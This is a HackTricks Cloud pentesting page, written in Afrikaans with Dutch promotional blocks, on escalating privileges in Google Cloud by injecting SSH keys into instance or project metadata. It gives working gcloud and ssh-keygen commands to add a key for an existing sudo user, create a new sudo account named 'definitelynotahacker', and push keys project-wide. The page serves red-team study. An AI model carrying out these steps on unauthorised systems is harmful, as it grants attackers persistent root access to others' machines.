# GCP - Voeg Aangepaste SSH Metadata Toe

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere manieren om HackTricks te ondersteunen:

* Als je je **bedrijf geadverteerd wilt zien in HackTricks** of **HackTricks wilt downloaden in PDF-formaat**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
* Koop de [**offici√´le PEASS & HackTricks merchandise**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit je aan bij de** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Wysiging van die metadata <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Die wysiging van metadata op 'n instansie kan lei tot **beduidende veiligheidsrisiko's as 'n aanvaller die nodige toestemmings verkry**.

### **Insluiting van SSH-sleutels in Aangepaste Metadata**

Op GCP voer **Linux-stelsels** dikwels skripte uit vanaf die [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). 'n Kritieke komponent hiervan is die [rekeninge-daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), wat ontwerp is om die instansie-metadata-eindpunt gereeld te **ondersoek vir bywerkings aan die gevolmagtigde SSH-publieke sleutels**.

Daarom kan 'n aanvaller, as hy aangepaste metadata kan wysig, die daemon 'n nuwe publieke sleutel laat vind wat verwerk en **ge√Øntegreer word in die plaaslike stelsel**. Die sleutel sal bygevoeg word by die `~/.ssh/authorized_keys`-l√™er van 'n **bestaande gebruiker of moontlik 'n nuwe gebruiker met `sudo`-bevoegdhede** afhangende van die sleutel se formaat. En die aanvaller sal die gasheer kan kompromitteer.

### **Voeg SSH-sleutel by bestaande bevoorregte gebruiker**

1. **Ondersoek Bestaande SSH-sleutels op die Instansie:**
- Voer die opdrag uit om die instansie en sy metadata te beskryf om bestaande SSH-sleutels op te spoor. Die relevante gedeelte in die uitset sal onder `metadata` wees, spesifiek die `ssh-keys`-sleutel.
```bash
gcloud compute instances describe [INSTANSIE] --zone [SONE]
```
- Let op die formaat van die SSH-sleutels: die gebruikersnaam kom voor die sleutel, geskei deur 'n kolon.

2. **Berei 'n teksl√™er voor vir SSH-sleutelmetadata:**
- Stoor die besonderhede van gebruikersname en hul ooreenstemmende SSH-sleutels in 'n teksl√™er met die naam `meta.txt`. Dit is noodsaaklik om die bestaande sleutels te behou terwyl nuwes bygevoeg word.

3. **Genereer 'n Nuwe SSH-sleutel vir die Teikengebruiker (`alice` in hierdie voorbeeld):**
- Gebruik die `ssh-keygen`-opdrag om 'n nuwe SSH-sleutel te genereer, en verseker dat die kommentaarveld (`-C`) ooreenstem met die teikengebruikersnaam.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Voeg die nuwe publieke sleutel by `meta.txt`, deur die formaat na te boots wat in die instansie se metadata gevind word.

4. **Werk die Instansie se SSH-sleutelmetadata op:**
- Pas die bygewerkte SSH-sleutelmetadata toe op die instansie deur die `gcloud compute instances add-metadata`-opdrag te gebruik.
```bash
gcloud compute instances add-metadata [INSTANSIE] --metadata-from-file ssh-keys=meta.txt
```

5. **Kry Toegang tot die Instansie met die Nuwe SSH-sleutel:**
- Maak verbinding met die instansie met SSH deur die nuwe sleutel te gebruik, en kry toegang tot die skul in die konteks van die teikengebruiker (`alice` in hierdie voorbeeld).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Skep 'n nuwe bevoorregte gebruiker en voeg 'n SSH-sleutel by**

As daar geen interessante gebruiker gevind word nie, is dit moontlik om 'n nuwe een te skep wat `sudo`-bevoegdhede sal kry:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### SSH-sleutels op projekvlak <a href="#sshing-around" id="sshing-around"></a>

Dit is moontlik om die reikwydte van SSH-toegang tot verskeie virtuele masjiene (VM's) in 'n wolk-omgewing te verbreed deur **SSH-sleutels op projekvlak toe te pas**. Hierdie benadering maak SSH-toegang tot enige instansie binne die projek moontlik, tensy 'n VM uitdruklik projekwye SSH-sleutels geblokkeer het. Hier is 'n opsomming van die gids:

1. **Pas SSH-sleutels op projekvlak toe:**
- Gebruik die `gcloud compute project-info add-metadata` opdrag om SSH-sleutels vanaf `meta.txt` by die projek se metadata te voeg. Hierdie aksie verseker dat die SSH-sleutels erken word oor alle VM's in die projek, tensy 'n VM die "Block project-wide SSH keys" opsie geaktiveer het.
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **SSH na instansies met behulp van projekwye sleutels:**
- Met projekwye SSH-sleutels op hul plek kan jy SSH na enige instansie binne die projek maak. Instansies wat nie projekwye sleutels blokkeer nie, sal die SSH-sleutel aanvaar en toegang verleen.
- 'n Direkte metode om na 'n instansie SSH te maak, is deur die `gcloud compute ssh [INSTANCE]` opdrag te gebruik. Hierdie opdrag gebruik jou huidige gebruikersnaam en die SSH-sleutels wat op projekvlak ingestel is om toegang te probeer verkry.

# Verwysings
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
